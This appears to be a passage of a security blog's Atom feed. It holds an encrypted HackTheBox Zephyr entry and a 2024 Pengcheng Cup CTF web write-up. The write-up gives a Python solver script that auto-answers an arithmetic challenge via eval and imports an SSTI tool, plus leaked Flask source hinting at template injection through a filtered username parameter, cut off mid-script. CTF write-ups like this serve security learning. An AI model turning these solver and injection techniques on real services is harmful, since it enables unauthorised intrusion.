dbb82733b52b5638eacbc463c442987197953539d63c08b32d7fd829cb1e702f881d0eb288d1db7dfb86584e8e75ecf87471d9fae933a6531345f8ebc97c7785dbb766b390cf2ef635e15424ded4fe79f5da6558da8e736bc20bccec46d42a5156f0b51044a4f4aa71fe5d5a9eb7d7f78450a13bd025314c3639022025de132ef8ce0ef5bfeee8fc1142c6a42c34f0b74a68b523964fc913cfddbbe0fd2103c26663c75d8def8883c220fcf57c77836c787f63f2602353bbf6d83a05280d3eedba08c69009411fb9908a609e3f01ba8243032d50a4d6e46e4c6ac27873cf11d80b541b2d0b0553f7fa601217ae95b39c3354a01e0d417a8690005a09cebd7b46d1c5465ed548086ef11b6cf35aa395d7518a72655c74ed4351e8d786a17bc63cfade0d1e92f3d7bf9d1611bcd2d959766386331cc0431f8497809b8299baa2e538a1edd4b204ce4190fb6736337fce9814c43727d38afd4c3985ce6408f8de4b52a980c51d809962675e13553ff257670efcf96f371cfad825b491b88daad134311b7b71c24927fbfbc0a88a6b46bb9c9e591391d2774f384f0ac382f40f429959ebcab58d4f4d42b7740337c2e54cf3413ce34ca93cfafa3acb63b4f520ca58ab78f7bf467776cff1afa7200140514e530e66c96fb65caac96b6ab1f5d6422144066004e2a84a661d340f95673dee329324d6616bf42d7c898ba73ef1400944f1ed0c092f98635a2f616a4c2c81c6018bea1eafa971e1c4804d7acbfa4b1b67b7dca070a393c2256016ff31fbfe63941ef615d213a7fe53bd95c25af9fcdcc6b049dff291c3e5384cf355a4b90b4f166a8bb90513b8fda0e14ac6197507a62ddaf531b897440c98fb11f29cf69bb0173eeb2210c4d2e54c30e71cfb0e5806e33ebb0f0ccf58306721da9c2ce9ca6a82eb9b6ece33b1a8cda9ad3a1053d0d7f9555ebd0a761b775a8bc4881ec6885664dd7dc25d7d00c85cbf341139f3b5a2a4d157652348fb8e44f6d44a4f6ecad86fa39a75712e3f1f3d28975a4a07b4fa9a57498c0c14ed9783f83cde566ab05713719eb76990de76a32379365954758fd34c28da5f32998aee2468141aa55049e96671b2f7ec2604f0bf31185d1a4848f9d4fcb8f6fa3995904da13e929c89d57065bda0a2995f433b4c3fc72cba219a1665d282baf64576e2f2fd61392d3e5c2b25244da82f58564bc8a897ecc8fa41e9f6083cb9b21cff8ed230274397341d4d7e40fa8a3d6044bea2cf89c270f9ecf3475de640e1480e1199d366655cf5fcc61ff726e29eb9dd4da7df26d1e7ea918036b24d0619bbe4473a726f9fe0532c72807faa111efcb5ae5fcdb88c65514600152acdbb1e5f2733dbc60ea50fd10e27cdfbbaddad2d19957986b9b9736b39bc6174f79b3a0aad7c98bed93f7c9c90c76667ce93baddeab97aa39e3a75608832be3d91af46950e6118370bf9b52e21df7cc5d1e9064820124861d3a47f2d6f554601df212146bc7f9c841dac105b32440bfa528d05acad96a44d5c27e274fe0ae5771271553f10326c86ae805f1ed5fac9d6686f680926a50c73a8806b51fcb4dd7b356ccc43ebb5a2937f08723c751a4666f5805c5f5061b0cf80301f89a7b2ef7f110bfd49d1a76b9e3e422fa71c0d71cf81969144fc6527e261b9565a0a660c75338db80904b71954b7960eae030709c88165942e5a908b4fbf5260d82c890d13a8e0f5717b2895bf492145ab48c587182f15081bde85aae222aa0fb9b9bd8cc1f821232d3cccf3f33a9f4c7d5d7ab0c40b41a07fe8aa0d55cebb4bf50dbc1ad239717cfdddd6719791e60bc33b4c39f301fd9ba3081d319891485635920b0e98957c953ec88ee531c58d6ae5f94ca96d6cc70d5ac6af34fd576f9da57dfdb60cfdc69de5b3ed4430ce0520d0d4edb8b5a2cc650b1e0cf3995c839dd1a1124f1e80b2f8d7158719cd9636254e7b64a7b7dc6b7f1d55cbdb0f81615876b54530e8151e4f6280d6c8615968fdc40b8a8dcc9b31a0fff4335320343169df1b15f8508afdca61712ba810a12ed756babc07ad2eca39c44cb7c18f082e443d35d7eb03711b5b26f49e8f56314124a042ddfcc102cdf3c3ebfeb43b10fbce7e192ec15b6a3007c1262d66ff7bc0fc7a9934b4a3244d16377268f3e476a46178b603bab013d7660682c3e7bafefe6d25137dbdc2e24fe7953a2251a8731e74504037f8c8a9a9cce8cf5daa702a72321d25277ffba4920199263048c207fdfbf02cb06ae95c89c0b008723b3ed4c505af8fa0bcd7582785d0b83115b96fc9a3b9384354c1c9356f7ba3dd8ec14a13b33efad80baa641ce07729acde8ebf3c450a4386cacad5af5a1f6bc66bb63275d33eaabd3a35acd35c2e00b9052c5a68f2efadb16d76242a8ab42f417576cbc26de96de46f4c3eaa3e210a3121befc8e8a72134efff819d82ccd98a09c1354234656c561a00c15f9ee00c312c70d9d61bcc699342ca41ee37b1c3e4e5bd6cca075eb0f81893b8123bf1ffb4414e6d2bff369d3d30c6cf5b09b89110133f8ee9e718851f824ba862db863a70553add3a8ca78f5f3c64004ec3cd412b085a930d8cf3861dfa4ef1be11ee9cec6fddaec1cf2986aaa029ade2a5c471bedd48b7571f7d12c00e3f51484ac8c939c4ca385766780b0d525d3c2d7c06d7c9994c3bdb98d3d0b91ebc408123c6d4f9b58ca7b73f5b68b145f6edc5143454300ede0ba1e7a2186f52742e4f05a9b250b62f980570db2e6f89560ef09f2a007b556397b0afb76c4e65def5269cc15cbaab24d88ecf3bf42730ac41f4fc4b178f66f33eec84595475b0424808165e6d15ba6d44d5f0aa51fa5b923c2845709dba82100c1add1faef1daec94818037dc4527cad39b1b39d103967bfa64bfe7c83655f50672bbd1befe8de5fc3090678a663baf7421a4fd46b59f2ad2dca22307ef5fdcb2959600462bcae248ce49a6b52a3260ef3c7ff2f5dbc4fcd2caedfac0b28c7ade3c412066844abf6b17dd7bf4025095c1aaf4af1f969ce96cfee6101c72e2d2b6a9e871951a0f45c9c15320d7f36f0046fd31fa468e7b575ab7a5e21559b0409d3c3f11ff83faa6698eca2004b169fbd2a52746a7880008b76196b1d7fe814812c56d3b035771bf41b15c51d4d19d64e2a4a87d137c2b29aed737a3029354ecd6a6069b81d48991db068e267a1348119cda6b5430c1f7e40f68727d7b6595c9eacfc155dbf2700d386f6bf939b69a53f9333997c866774c32987fdd14566f637fe1b031864d1c94f9dc4b51cd153055959a98a8c221f0d6767844dcd854c20f8e576012e3de2feb9c796b27e63310bbfc6d19a51c240dfa789045f4f97b4bbc09db1b7e5f1aba9b47b964e9593e094f1d7b09bb7156503bdcbadb4f4a67779b8312ef6842c2aa77233b05c184daa98a96d89c0cb5d67890505da8f71e710fbdb462ea6afa45d4f618d66c0e336b9c49c19d49394de30dcee276920ffaf0eb1d608652d7065574115e096fc00689590d930d36d06cdb8c7cd07f4e1a19f4a7521fc0954c7a8b60aa3701e47538b0622799174b392c41d130f7bfbf042bd93dbadc09a01b44ef4af5d34d3b6519d9d5e39c55f97a213152fed88094c34803256bc0af774259fe664d8fda3b6809a7573fcb84800695ce853f51821f2e486193d02b38b1f25cbb6a28c376deb30622b48e857374da77f15461b72df559f80aa379c16b32ca8afa9d1f674548f67bb448db88a73a437fd4a2564fe16e87cf8507608261056acace5a6283a165dedd14480bd9bf0025a95fbaab0dce14cea2020d1be805d6cd0568cebf48b617be273d814a003aa5d1211bfb238c158ade34562d17d2cd3eedb22ee5923ee12f202c5bc6fff493272d8387d0d1e21ccecbc3609e68db23c4050a4e052f80849b481bf31ce900ed75f60c893d33e63cd9f4f4ba6350300be10a5f427ceb59374cc224c26c12c47620db8c81bd150a6101711e7c58165c03b2132bac6f2c8a59dfc6fc680a8d4110ff9035d51dccb1f1f468430c96c3f646f955d9ca989e93b9b7db741624053e25dcf7b85bee49d8e190558e29710a192619658151a475b0a53b33ab0e916ed8c4bba1dbc5d1b084530c3d0bb97c1dfcda05d7ae26a46c7ba84460de451c611e37841ded29f8b87f3871bd925bfcaf1926548bb2d80977b64026bad0f2849ec2e105857622c9adac2ada081e0f0c90af6265650904fc20545c04ac3392f58936b33a4d9f2c114aea0b90522db75dfd6e55f3328463d2ea100de15b3a8c130801c913d6e4a7b7a706cc861ec2875c7b505d295dbfba50fa68375a4b70b58f701f8b617d09a02d5b9534e0c2b003c3778561de54371380d1772ef9cafc044cc66d2460fbcb1c8c8b069ca84be9b7c63faeb4aecde627de9f4432d892931d8bafb6e7699cce83a92b038e7261b57d5ce6c69754bbf77564820f3c86dc63bf143df6c99d91bf100e14541a63128933a583c63bffdd78c6b54b0e4512f763c67a5e7bae99643bebb22370f3e0247ed0f3dd255a3b3147b145b37aecc0e62e97502ae18faef91af49d2c672baeb1fce0aaf2b7292f99c42af0fa5d9eb99d58c09eaebac397961a2ce7a019a6592f0692228dc019cb3152aea5612580d7e15ff560892addea3e707f7c6cb5dd57fb707e68767664aac608f9ff23c09d12c6b65da27a1844974b0679ba99f592833b0b245cdcf97614f544cd770c38123cc57b8647e679042d12b654bea34d2680b39f04459bf40a73530d187860de04e6a08ae5f5314637e69842fcf191165129e53cfe15d0669a52e1fae684d3c34fdb190cd4beea949cf3f5de186a1f5523b90afe5b5098b54bcbc3265b2055ba775f5eeda8226034f829f8d02c8c77cd3674e60622b86a7c5559fb963f52185a311b0d7e8baf0afed3d8a7407d6698a4d27ce8ef9170377f2e8aec9546d3ef3884df4a336e4e32a29ad8665558211f7b35d5d9e0eb91a631988ad08b1a099da129294ccc3613374936396d71cfa8160de1122726110b6f108ad89cbd2b67ca96f3e23574f4e446d55abb65b2cc1feab4a07e605069808dcb84d3ebfe20bca9773b74ef8798419c555c37e78726f47f6c553aaba0ab46926d9e6ab4d60269a1db1afc8fea180f37cce24e5ad3e0f062909988ec6c8058de7b3515792263caef56cd1e28922a57bc2a064fd22183cbd3db86fcae0f00d4cb745928e59cc8004270943c278aa93a6d533ab08c7c401dd3b57f9b0a13d3a9eb41f13cd047d0d5ed58a25b982b0149612b69c69c8db0a983e823e641fe944cdfb50e8ad0cc62c767d6df8146c443cfaa6f33fb96989b4475ca5512fbe914945f72d24aa474c41f59bd858cb762e3bbb0ff2ecbf8e7cabcad06b17ee455ae901bb130d6ad9efd5a0da7e8a4fd8cd12ee493b76479724029a4b696cbf83b2d45f23ab43ffc0094bf5b66a220df9bd7b281078886cb166241af080f78a51dbd1a0284153a6ce14ceb1c5a0deeb9779fa000718343dceed2707d16cd93e0b1d4c4bd18304b771b1d13a4d0d1c09f0948dc14cb2850935f9d200823af425dcdb5ad2e4845fcbd7e192b97997ce3b7ecba6923c01d12621c1161381a7d2f5c2e82f9504f9d085cce92e02b9178519e0a1771bb92ae23d5170ca9eae7546508e92b9c84be455f5195df79fd1247c3161dd157951b8f56217c1d1af012ad4a2c31eac0bafb606922eeab3d13386f4c80109c2aa45999808808be8c711c476cf2b6c1ac255bf5e8ac05cc417fc3ff7c9e5426804b40cd3f73ea00f9ad1ed23e33ae677a86a280b2ebc893d19c26f49a5abcaaa56210d5b131c902eb7ae3f921e8aa126728c0b90f5d720533147972c3986ad0e6055c17088280bfd3708d7638e50ad2f401ed0b38ff299b74635dfd62af05c20f73346e78d8de5917d8be32e3a5456d425375533ac0088dfbb82bd48557f00e7dfc0f3c0e865948e46ea349cbebc1d22132fffb8704ed42fd2271de7cb019d1ac553dd9d4e8ce2158a2364bd580f2dc1929f5ec7c456807e05051762ba4f2ef1166b87e3bb5aaf54d93bc6054c3f8f10b45306ec96a33dca5e25e6116f5a1b12cd2734dc61ff93c456149f65d8c8790f7a75fef2fbb8a6f56959f93b8c6c099a2669185d88e8a7d82ff52ad9092965966fb822bfe22ada6e791713636dc8273de889b8a8aa038682bfcbe190847ecedad3d0efc4b2db1453583701dbf4c876f567bea0946a37b480c49896149468d029b4166d78b66ed4f19983a574c7b275af3bd8fa140899daa693fcd76bfcc262755f1e3b7044e924f33ede20272f4db828619557d0e86694f26c28c164c58b91586502d29bfbf22dc5a72abdcfcfae2a8c0ec33e9f18fdc2049465d046d91056dbfd2dbf513fd66fea0faf3e881e426161cb24e51ac748cdceac5068a6a6fc1ed2449d878b41360ae9e851415bfce30968a6f4b51bce5631af801f6b1385df5709bb7012f29a5fc0f0f05c8831dbccd89c1c1496e184d634f21be5b7556be8816b3cd89daa71c2be3f7b1a9aa017a5106de9655086c1bffb39e94b8496336c4588b144f121e7f0ec79af905c2def83ebb1dd258a87c81048749d8ed605127c0d1a85344c5041158e57213ce6c99d41a809099e94404a1fba4fa987f77aa285caa198d7d83b9de47e448a447e0c3e3294b1a64737d737133fe766daba48079906eea26c1a374f46f7911f01ecd18bdf58883c9d24a63ffbc491f5a4ad4712958149a15bd30b82986b8f70023b6ebca28cf540f73735637de92992ba05cb101e984221f498a3c28d79bf06340b70d304bfd6c8191213e2f418dd09683d110251a9190d28cebc669551a95e999cb969d81fc44c85c353bf3471172ef314524e03302a749ccbc64edd70797ba3eabe996bc27e3f55a4084e05000bec112f2750bbe53176476edb633726495b0922a1bc28b730faeb5a3935515c9bfaf800673c99a1af46afe92e23e1dc3685bbbe0bcd5e39560f40bd3da3e31a35d0ea89670d7271de3d8adbcdb5f39a8eb5392b82e1ed87dfd0863c2435a953eefd6e699ac5ad6d8090455255e36548bca2377da115bac3f11d6504260b1d223480fbb094a01df46dcf364c55d34f8bcab64e1d71b3e9fa80f6e059ad32c77a961da8a9ed156e56f483a3a504fc7b2726871637827442fe4d19d08e03e52b2c4e49dad76cb3aa11e7e3861535231140d35f87b3fd27e656014716cab022dec85efe85c51d2bffba9fa2651f0c8da42a73cf99ddfbd22b85d30377031f9cc80c0f229a5123a9fc3f26af28c682b3971e8e29cadf7f100706512fed8df766e6b845037184f651339307b19272d3783fbc2e3a0886182c0c8521402393935385c386d1b3b54a46ed4e2c4b9d1a872d1299fe9fca1bc89330cceb9f17bfc5fcbfeeb22f9af5e2ff6811497878a59136df8e412960391e847adb2bd710fafe1d513b9c17a4062c7aadf4bf0df497da459a8395014e048988cb5daa1d24c6672046d4b6287dee86ad8f4354dc2604682a8d6141867260c8451a1130d6c09cbe93e6623e9f68e08dd7996896b4c1cc5ebda586825493e5790df066f6e2bb74c990f496811ba53591ef6f3f766c84c0b28480b5f4822bb4d19cb8a8fdfa88fe6fc912583a01820034d722d183cc240f91c31c45cf7d484dde478dc2aa99960ca6e7e2f69b6b9d358b1bd13b0c0838e87649da07783b153b08abb8bae568fc2d55092968857cad7d16d8d6b5ed2c999f365f565a5e2d17e86e740e311187d19837a48c96a83a4bf0d1a2f8037dcd90e7c5c93eec9397bcd815e5521bd0b8f2e586cc01fc82f51097e14757ddf795b5bf5b9be780cd89cf118bbc5f0084ce95c8fac165e92606dc263dbec33f64d829aabcc5dca61e153869e787ee72eef34eb4a621e35ab6b6428a144067b5b30f88c7c1796d34e65977339ee0fe0369cfa76e6fb048c13aa5196053b3ce532b5875da184a7aa987d079f631d18616afd2b65482910f95b1dc5697b5e082b9a3ee4d9e549be391a6510200bff578cfde01ae76fb275c9d8ca724cd9c9f5edccd9554f8900aa239b29e508804b22fa32df183c07576c65ab69f3a6c570d9ea9793f25bb4ff7919739a3aa7ad8bb9677df5f6f15fe589fc75d3d1d190e0c2cfc416f85a71624e5cd37aa567ae4a370aee4472f1993a997bb5a947005eb2113dd2666ba1d8047659535663db2123707a20fc75a873e4a1324d22f4e72622972d8360965ebe9d2ff538db928a0af3c03a5eb24e4b7de23a3fe7a936adc47945afed176d4732abac861468cb2f7b17dbf217ca957c6d51369306e641f9bd1563dbd7b17154a78ed85edb32329ae1ad82c01fbb6a3ea4ebff32d37d5632df4c21bf75f671b6073f3b7ae0eb37fc3a7299e91b1d2a5cb8acd4b4623c546ecac4c8b4c02598565dbc699a602053991d4ae4ef1ffb2fe3248c9c6ec5cd90a56f2343d383b168e1aff9468ec5a6186724515131d74597ed67396954cfd7ef1c596a56f158cbe8a81c985fcad65889517c261d1ea10622e67b9bdb3cc8c8127692ad581fbf99ff0789158d45df6ef5ed7f4eddd9b9eb7150033b3bd32e57ebfc281ae2f2e8065312f25317f8ea02fd0e812203c7130d5b594d791884c43e21ec964a407f91dc92edea4501330f7e583ae008b87a220692edf52b9bca5c9aa731c32e3cb1072c6b917474e25a013678bca26f0034564f5de0d316470ae10c12e83fb1859ef5476311da99dcd8e12ba88d174c2f585bbff4dc6fdf655da24e758a2ef2077198976503662a54a657d73d674cc10aec55cc56848287f1b08d902bbe35cd4f1c3ac3c0962382a6febd85a2947564d45aee06ed35adb59eb617a7b544fd1383af3eb29c7355025e1cb7daf1516ef83a6e5fca74f344aa715e64e9921dfe069ccbabbd5983cb5279b22e5d0232011f45335c30593de6fdcdbb4598905877cc477bcdde8d3be6b885543bf760d18afdf68de116e725ea4aba10766db6ed3abe197eafe322d35d6a8f0ae75d16a908aa32026632755a18afec22fab28072c6a883f27590deeabb14e8d5b6ccb90435c92021d73f06cde1079d48bab204117f2b03e9bf3ab30a62e6af036372dc9eb186710835f096b614636457acbed8355067de3490bef91374a75308c4e71db46be45ca45e5a20342070800ad039c2eb7aee3181ed7547b7358dd2d1e3726a990d61dc15d7f1e570cddd6946f860d0cb49b29e33227cfc960b9ad7c480e41026bf8bbd8c9e61426730ac1d6ce3918f96d484d84ad1c724e9f5817067c47d32cea411c29f7e61b077f9da03a8fa02a2ab8fada37f73b2ee255ea34bba520ecb9fb94a97d05de521b285f60addd4897007a6ee20d88e82253e4e23398c1329e38e359e137963d0f6171878de9e782cdcca13e5311e7a6801d7205086f67488bf0394be2d9044892fe56dc32745484297012ba485b868a928d3106ae9bee38de714899e7b9201edd8d07c57de49b7febcaa07139471a97facf802872d600fdf767391e6b088622fec16d1f66361b084d06cedfbff74c049c08926dec25d7072592c1b820a8ccf8089a4da9795a5ccf7eb85fa5a74a381a3ef49daa7e3b3f4084323da3c5243b8430d4ce427fa1d8a7fe5bd4e40d250cecd8cb9d08d9c4d459401e2404ae58aa0b2c49f336758acd90c14f93a32d03ebb8f3f565448c858203fef41c9d43598d57dd74411d7f84fd86bc569d152431a7368560517a9d7e45789a0b2c719d675661d0df5001cdf0983d997cd702892895a2bcab80cfa00ad1d1a347479c31b3a23314485a3f0f670428e44137c26b2e09ea392fd5197a5dc12795bbee0476372a53b60637cd2e144a02eaa7f3ea606b5cd14d100c725030d07d855db8c4a7a3982809c53bc73e5ed89eff84d484c9b3df71688bd5bcbee4ee85e694eb39496d2f9356f4a43f127f01529d355a09e859b257f90d925a12309c6350c076f7030049bec38304cb0c58a3fdd6bba46dc05bb1abb6b3caf1ddbc8ff50894fc3080b08a303f932760e0bb509a1494d33b6cfb7542f56b84b8bf4b971b108adb02d0c1318924513c11e34469e21639c2805b89feaa56236cce50e12fdf22f9ae4a74cd2fdcaff4859644fbc1f0f8a6821672664272facae3de206a74354422dd2ddecc79b72deaf402b87edb724670a6d773009f7eaabe449fe9b841b917aeed1fdb1b22a4b24026b65a75de0b27eebd1df7d016d0e2644676a10491b2cbb54b1e2036a2511ad1e29f24cba280841d306b67362ca2359341e88640d1c855211ca615e5a8d6e07ed8979bb7990722338d523648e002b57005ce72d09281ae4b1cabc3cf90c673c6983d04674dc4ae9fcfac7886f54b3d0796e444482ccdf607e75d3963bcf613682623678ed23ba92f7a84036d43b89a89d8a240fc378a42e40ecb3115499947217bc6e93d3f202b5596c343933af8b67104ea36020d964d99ce8e2d7b39abb699bbaad6efde014e2134c7fb1ca4a660593c1a7437d0f3e47e5c9d9e0e25aa3a762c6d88c738b903ac56d384b1f49cb51f2b3955c78a9e900b42af68d2d4574ffe54b76baee5f463ca84423735a90232e79db7db0451de930741e0cb3de3c09131dd7a6852baf3d33cad57f4fc1c9b0d64d330885eb7636e9303935dd</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-xray">      <input class="hbe hbe-input-field hbe-input-field-xray" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-xray" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-xray">内容还没写完，需要密码才能查看！</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-xray" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>        <path d="M0,2.5c0,0,298.666,0,399.333,0C448.336,2.5,513.994,13,597,13c77.327,0,135-10.5,200.999-10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">HackTheBox篇ProLabs系列之Zephyr</summary>
    
    
    
    <category term="HackTheBox" scheme="https://ya1orin.github.io/categories/HackTheBox/"/>
    
    
    <category term="HTB" scheme="https://ya1orin.github.io/tags/HTB/"/>
    
    <category term="Windows" scheme="https://ya1orin.github.io/tags/Windows/"/>
    
    <category term="Active Directory" scheme="https://ya1orin.github.io/tags/Active-Directory/"/>
    
    <category term="ProLabs" scheme="https://ya1orin.github.io/tags/ProLabs/"/>
    
  </entry>
  
  <entry>
    <title>鹏城杯 2024</title>
    <link href="https://ya1orin.github.io/posts/da65110a.html"/>
    <id>https://ya1orin.github.io/posts/da65110a.html</id>
    <published>2024-11-10T12:57:59.000Z</published>
    <updated>2024-11-11T00:55:57.684Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><h1>Web</h1><h2 id="python口算">python口算</h2><p>访问题目看要求是要一秒答题，果断找gpt写脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> fenjing</span><br><span class="line"><span class="comment"># 主页面 URL</span></span><br><span class="line">url = <span class="string">&quot;http://192.168.18.28/&quot;</span></span><br><span class="line">calc_url = url + <span class="string">&quot;calc&quot;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发起第一次请求，获取初始页面内容</span></span><br><span class="line">response = requests.get(url, headers=headers)</span><br><span class="line">soup = BeautifulSoup(response.text, <span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查 h1 标签内容</span></span><br><span class="line">h1_text = soup.find(<span class="string">&#x27;h1&#x27;</span>).get_text().strip()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;第一次请求内容:&quot;</span>, h1_text)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果 h1 标签内容为 &quot;Are you ready for this?&quot;，等待一秒后检查新的内容</span></span><br><span class="line"><span class="keyword">if</span> h1_text == <span class="string">&quot;Are you ready for this?&quot;</span>:</span><br><span class="line">    time.sleep(<span class="number">1</span>)  <span class="comment"># 等待 1 秒</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 第二次请求 /calc，模拟页面定时刷新后的情况</span></span><br><span class="line">    response = requests.get(calc_url, headers=headers)</span><br><span class="line">    h1_text = response.text.strip()  <span class="comment"># 获取返回内容</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 检查返回内容是否为算术表达式</span></span><br><span class="line">    <span class="keyword">if</span> re.<span class="keyword">match</span>(<span class="string">r&quot;^[\d\+\-\*/\s]+$&quot;</span>, h1_text):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;算术表达式为：&quot;</span>, h1_text)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># 使用 eval 计算结果</span></span><br><span class="line">            result = <span class="built_in">eval</span>(h1_text)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;计算结果为：&quot;</span>, result)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 构造带有计算结果和 username 参数的 URL</span></span><br><span class="line">            answer_url = <span class="string">f&quot;<span class="subst">&#123;url&#125;</span>?answer=<span class="subst">&#123;result&#125;</span>&amp;Submit=提交&quot;</span></span><br><span class="line">        </span><br><span class="line">            <span class="comment"># 提交答案并打印返回内容</span></span><br><span class="line">            response = requests.get(answer_url, headers=headers)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;提交答案后的返回内容：&quot;</span>, response.text)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 提取返回中的 flag&#123;&#125; 内容</span></span><br><span class="line">            <span class="keyword">match</span> = re.search(<span class="string">r&#x27;flag\&#123;.*?\&#125;&#x27;</span>, response.text)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">                flag = <span class="keyword">match</span>.group(<span class="number">0</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;获取到的 flag: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;未找到 flag!&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;计算表达式时出错：&quot;</span>, e)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;返回内容不是算术表达式：&quot;</span>, h1_text)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;页面内容未发生变化，h1 内容为：&quot;</span>, h1_text)</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241110204414282-806340589.png" alt="img"></p><p>得到奖品</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>(<span class="params">solved=<span class="number">0</span></span>):</span><br><span class="line">    <span class="keyword">global</span> current_expr</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 前端计算</span></span><br><span class="line">    .....</span><br><span class="line">    .....</span><br><span class="line">    <span class="comment"># 通过计算</span></span><br><span class="line"></span><br><span class="line">    username = <span class="string">&#x27;ctfer!&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">&#x27;username&#x27;</span>):</span><br><span class="line">        username = request.args.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> whitelist_filter(username,whitelist_patterns):</span><br><span class="line">            <span class="keyword">if</span> blacklist_filter(username):</span><br><span class="line">                <span class="keyword">return</span> render_template_string(<span class="string">&quot;filtered&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;你过关！&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template_string(<span class="string">&quot;filtered&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, username=username, hint=<span class="string">&quot;f4dd790b-bc4e-48de-b717-903d433c597f&quot;</span>)</span><br></pre></td></tr></table></figure><p>发现这有个额外的参数username，就一直试get传参，怎么传都传不上去，多次测试后发现需要用get传data值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 构造带有计算结果和 username 参数的 URL</span></span><br><span class="line">answer_url = <span class="string">f&quot;<span class="subst">&#123;url&#125;</span>?answer=<span class="subst">&#123;result&#125;</span>&amp;Submit=提交&quot;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;username&#x27;</span>: <span 